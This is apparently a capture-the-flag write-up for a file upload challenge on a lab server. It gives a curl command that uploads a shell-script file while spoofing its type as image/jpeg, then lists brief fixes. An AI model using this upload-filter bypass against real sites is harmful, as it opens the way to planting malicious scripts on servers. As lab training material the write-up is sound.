# 12_File_Uplaod

Here is the located page for having the flag :
http://10.12.100.35/?page=upload

# *How to find it*

go to add image in button of home page to redirect you http://10.12.100.35/?page=upload

In the command line, create an empty file that could potentially contain malicious script as follows

__touch flag.sh__

Send the request through the curl command line utility with the appropriate IP address as follows to get the flag

__curl -s -F "uploaded=@flag.sh;type=image/jpeg" --form Upload=Upload "http://10.12.100.35/?page=upload" | grep "flag"__

# *How should secure it*

- use function like getimagesize() in php to check if the image content is valid.
- blacklisting file extensions.

# *SRC*

https://www.geeksforgeeks.org/php-getimagesize-function/



